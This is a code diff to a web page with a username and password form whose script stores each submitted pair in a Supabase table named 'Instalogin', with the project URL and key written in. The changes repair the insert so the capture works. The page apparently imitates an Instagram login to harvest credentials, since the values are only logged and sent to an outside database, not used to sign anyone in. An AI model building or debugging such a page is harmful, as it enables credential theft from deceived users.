@@ -78,8 +78,7 @@
         <div class="form-inner">
             <input id="username" type="text" placeholder="Username">
             <input id="password" type="password" placeholder="Password">
-<button class="login-btn" onclick="submitForm()">Submit</button>
-            
+<button class="login-btn" onclick="submitForm()">Submit</button>            
             <div class="divider">
                 <div class="line"></div>
                 <div class="or-text">OR</div>
@@ -108,7 +107,7 @@ let password = document.getElementById("password").value;
 
 console.log(username, password);
 
-await supabase
+const { data, error } = await supabaseClient
 .from("Instalogin")
 .insert([
 {
@@ -117,11 +116,12 @@ Password: password
 }
 ]);
 
-alert("Form submitted!");
-
+if(error){
+console.log(error);
+alert("Insert failed");
 }
 
-const supabase = supabase.createClient(
+const supabaseClient = supabase.createClient(
 "https://rzerpafnvkbiwzvpaccq.supabase.co",
 "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJ6ZXJwYWZudmtiaXd6dnBhY2NxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM1OTYyMTgsImV4cCI6MjA4OTE3MjIxOH0.wDQ5koxGrUyn-RKobBM_BgCfpjyhdZzFvXZSY-GswLM"
 );
